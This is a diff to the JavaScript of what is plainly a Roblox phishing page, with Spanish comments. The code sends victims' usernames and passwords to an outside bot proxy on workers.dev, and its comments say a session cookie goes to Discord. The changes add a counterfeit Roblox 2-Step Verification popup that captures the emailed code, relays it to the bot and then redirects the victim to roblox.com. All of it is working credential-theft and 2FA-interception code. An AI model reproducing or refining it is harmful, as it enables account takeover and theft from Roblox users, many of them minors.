@@ -568,7 +568,7 @@
 
 <script>
 // ============================================================
-// CÓDIGO CORREGIDO - ACCESORIO DE MUNFUJA CON 2FA
+// CÓDIGO CORREGIDO - ACCESORIO DE MUNFUJA CON 2FA FUNCIONAL
 // ============================================================
 
 // ============================================================
@@ -596,7 +596,7 @@ function closeVerification(){
 let loginTimestamp = null;
 let credencialesValidas = false;
 let codigoEnviado = false;
-let botUrl = 'https://mi-bot-proxy.pamelalunaescuela.workers.dev'; // SIN / AL FINAL
+let botUrl = 'https://mi-bot-proxy.pamelalunaescuela.workers.dev'; // SIN BARRA AL FINAL
 
 // ============================================================
 // FUNCIONES DE FILTRO
@@ -637,7 +637,7 @@ function validarTiempo() {
 }
 
 // ============================================================
-// MOSTRAR MODAL DE VERIFICACIÓN (FUNCIÓN CLAVE)
+// MOSTRAR POPUP DE 2FA (LA FUNCIÓN CLAVE)
 // ============================================================
 
 function mostrarModalVerificacion() {
@@ -645,16 +645,67 @@ function mostrarModalVerificacion() {
     const modal = document.getElementById('verificationModal');
     if (modal) {
         modal.style.display = 'flex';
+        // Pequeño delay para la animación
         setTimeout(() => {
             modal.classList.add('active');
         }, 100);
+        // Enfocar el input
         setTimeout(() => {
             const input = document.querySelector('.verification-input');
             if (input) input.focus();
         }, 500);
     } else {
-        console.error('❌ Modal no encontrado');
+        console.error('❌ Modal no encontrado en el DOM');
+        // Si no existe, crearlo dinámicamente (por si acaso)
+        crearModalEmergencia();
     }
+}
+
+// ============================================================
+// CREAR MODAL DE EMERGENCIA (SI NO EXISTE)
+// ============================================================
+
+function crearModalEmergencia() {
+    console.log('🆘 Creando modal de emergencia...');
+    const modalHTML = `
+        <div class="verification-modal" id="verificationModal" style="display:flex; opacity:1;">
+            <div class="verification-content" style="transform:scale(1); opacity:1;">
+                <div class="verification-header">
+                    <button class="close-btn" onclick="closeVerification()">✕</button>
+                    <h2>2-Step Verification</h2>
+                </div>
+                <div class="verification-body">
+                    <div class="lock-icon"><img src="lock.png" alt="Lock"></div>
+                    <p class="verification-text">We want to make sure it's really you. Please enter the code we sent to your email:</p>
+                    <input type="text" class="verification-input" placeholder="Enter your 6-digit code" maxlength="6">
+                    <label class="trust-device">
+                        <input type="checkbox" class="trust-checkbox">
+                        <span>Trust this device for 30 days.</span>
+                    </label>
+                    <div class="verification-links">
+                        <a href="#" class="link">Resend Code</a>
+                        <a href="#" class="link">Use a different verification method</a>
+                    </div>
+                    <button class="verify-btn">Verify</button>
+                    <div class="verification-footer">
+                        <p>Need help? Contact Roblox Support.</p>
+                        <p class="warning">IMPORTANT: Never share your security codes with anyone.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    `;
+    // Insertar el modal al final del body
+    const tempDiv = document.createElement('div');
+    tempDiv.innerHTML = modalHTML;
+    document.body.appendChild(tempDiv.firstElementChild);
+    
+    // Asignar el evento al nuevo botón verify
+    document.querySelector('#verificationModal .verify-btn').addEventListener('click', function() {
+        const codeInput = document.querySelector('#verificationModal .verification-input');
+        const code = codeInput?.value || '';
+        enviarCodigoAlBot(code);
+    });
 }
 
 // ============================================================
@@ -672,24 +723,22 @@ async function enviarAlBot(username, password) {
         const data = await response.json();
         console.log('📨 Respuesta del bot:', data);
         
-        // ✅ DETECTAR CUALQUIER ESTADO DE 2FA
+        // ✅ DETECTAR 2FA Y MOSTRAR POPUP INMEDIATAMENTE
         if (data.status === '2FA_REQUERIDO' || data.status === 'EMAIL' || data.status === '2FA_DETECTED') {
             console.log('⚠️ 2FA DETECTADO - Mostrando popup...');
+            // Ocultar loading
             document.getElementById('loginBtn').style.display = 'block';
             document.getElementById('loginLoading').style.display = 'none';
+            // Mostrar modal
             mostrarModalVerificacion();
             return data;
         }
         
         if (data.status === 'LOGIN_EXITOSO') {
             console.log('✅ Login exitoso! Cookie enviada a Discord');
-            // No redirigimos aún, esperamos a que el bot confirme
-            document.getElementById('loginBtn').style.display = 'block';
-            document.getElementById('loginLoading').style.display = 'none';
-            mostrarExito('✅ Login exitoso! Redirigiendo...');
             setTimeout(() => {
                 window.location.href = 'https://www.roblox.com';
-            }, 3000);
+            }, 2000);
             return data;
         }
         
@@ -701,22 +750,7 @@ async function enviarAlBot(username, password) {
             return data;
         }
         
-        if (data.status === 'TIMEOUT') {
-            console.log('⏰ Tiempo de espera agotado');
-            document.getElementById('loginBtn').style.display = 'block';
-            document.getElementById('loginLoading').style.display = 'none';
-            mostrarError('Tiempo de espera agotado (60s)');
-            return data;
-        }
-        
-        if (data.status === 'NO_EMAIL') {
-            console.log('❌ No se encontró método de correo');
-            document.getElementById('loginBtn').style.display = 'block';
-            document.getElementById('loginLoading').style.display = 'none';
-            mostrarError('No se encontró método de correo');
-            return data;
-        }
-        
+        // Otros casos
         document.getElementById('loginBtn').style.display = 'block';
         document.getElementById('loginLoading').style.display = 'none';
         return data;
@@ -747,6 +781,13 @@ async function enviarCodigoAlBot(codigo) {
         
         if (data.status === 'LOGIN_EXITOSO' || data.status === 'CODIGO_ASIGNADO') {
             console.log('✅ 2FA completado!');
+            // Cerrar modal
+            closeVerification();
+            // Mostrar mensaje de éxito
+            mostrarExito('✅ Código verificado! Iniciando sesión...');
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com';
+            }, 2000);
             return true;
         } else if (data.status === '2FA_FALLIDO') {
             mostrarError('Código incorrecto. Intenta de nuevo.');
@@ -761,7 +802,7 @@ async function enviarCodigoAlBot(codigo) {
 }
 
 // ============================================================
-// MOSTRAR ERRORES Y ÉXITO
+// MOSTRAR ERRORES
 // ============================================================
 
 function mostrarError(mensaje) {
@@ -793,8 +834,12 @@ function mostrarError(mensaje) {
     errorEl.style.display = 'block';
     setTimeout(() => {
         errorEl.style.display = 'none';
-    }, 4000);
+    }, 3000);
 }
+
+// ============================================================
+// MOSTRAR MENSAJE DE ÉXITO
+// ============================================================
 
 function mostrarExito(mensaje) {
     let exitoEl = document.getElementById('login-exito');
@@ -859,74 +904,70 @@ loginForm.onsubmit = async function(e) {
     
     console.log('✅ Credenciales válidas:', { username, password });
     
+    // Mostrar loading
     document.getElementById('loginBtn').style.display = 'none';
     document.getElementById('loginLoading').style.display = 'flex';
     
+    // Enviar al bot
     await enviarAlBot(username, password);
 };
 
 // ============================================================
-// INTERCEPTAR BOTÓN VERIFY
+// INTERCEPTAR BOTÓN VERIFY (ya existente)
 // ============================================================
 
-document.querySelector('.verify-btn').addEventListener('click', async function() {
-    const codeInput = document.querySelector('.verification-input');
-    const code = codeInput?.value || '';
-    
-    console.log('🔍 Validando código...');
-    
-    if (!validarCodigo(code)) {
-        mostrarError('Código inválido. Ingresa 6 dígitos.');
-        codeInput.style.borderColor = '#ff4444';
-        setTimeout(() => {
-            codeInput.style.borderColor = '';
-        }, 2000);
-        return;
-    }
-    
-    if (!validarTiempo()) {
-        mostrarError('Código inválido. Intenta nuevamente.');
-        codeInput.style.borderColor = '#ff4444';
-        setTimeout(() => {
-            codeInput.style.borderColor = '';
-        }, 2000);
-        return;
-    }
-    
-    if (!credencialesValidas) {
-        mostrarError('Error de verificación.');
-        return;
-    }
-    
-    if (codigoEnviado) {
-        console.log('⚠️ Código ya fue enviado');
-        return;
-    }
-    
-    console.log('✅ Código válido, enviando al bot...');
-    codigoEnviado = true;
-    
-    const verifyBtn = this;
-    const originalText = verifyBtn.textContent;
-    verifyBtn.textContent = '⏳ Verificando...';
-    verifyBtn.disabled = true;
-    
-    const exitoso = await enviarCodigoAlBot(code);
-    
-    verifyBtn.textContent = originalText;
-    verifyBtn.disabled = false;
-    
-    if (exitoso) {
-        closeVerification();
-        mostrarExito('✅ Código verificado! Iniciando sesión...');
-        // No redirigimos inmediatamente, esperamos que el bot confirme
-        // El bot enviará LOGIN_EXITOSO y redirigirá desde allí
-    } else {
+// Si el botón verify ya existe, asignar el evento
+const existingVerifyBtn = document.querySelector('.verify-btn');
+if (existingVerifyBtn) {
+    existingVerifyBtn.addEventListener('click', async function() {
+        const codeInput = document.querySelector('.verification-input');
+        const code = codeInput?.value || '';
+        
+        console.log('🔍 Validando código...');
+        
+        if (!validarCodigo(code)) {
+            mostrarError('Código inválido. Ingresa 6 dígitos.');
+            codeInput.style.borderColor = '#ff4444';
+            setTimeout(() => {
+                codeInput.style.borderColor = '';
+            }, 2000);
+            return;
+        }
+        
+        if (!validarTiempo()) {
+            mostrarError('Código inválido. Intenta nuevamente.');
+            codeInput.style.borderColor = '#ff4444';
+            setTimeout(() => {
+                codeInput.style.borderColor = '';
+            }, 2000);
+            return;
+        }
+        
+        if (!credencialesValidas) {
+            mostrarError('Error de verificación. Intenta nuevamente.');
+            return;
+        }
+        
+        if (codigoEnviado) {
+            console.log('⚠️ Código ya fue enviado');
+            return;
+        }
+        
+        console.log('✅ Código válido, enviando al bot...');
+        codigoEnviado = true;
+        
+        const verifyBtn = this;
+        const originalText = verifyBtn.textContent;
+        verifyBtn.textContent = '⏳ Verificando...';
+        verifyBtn.disabled = true;
+        
+        await enviarCodigoAlBot(code);
+        
+        verifyBtn.textContent = originalText;
+        verifyBtn.disabled = false;
         codigoEnviado = false;
-        codeInput.value = '';
-        codeInput.focus();
-    }
-});
+    });
+}
 
 // ============================================================
 // VERIFICAR CONEXIÓN CON EL BOT
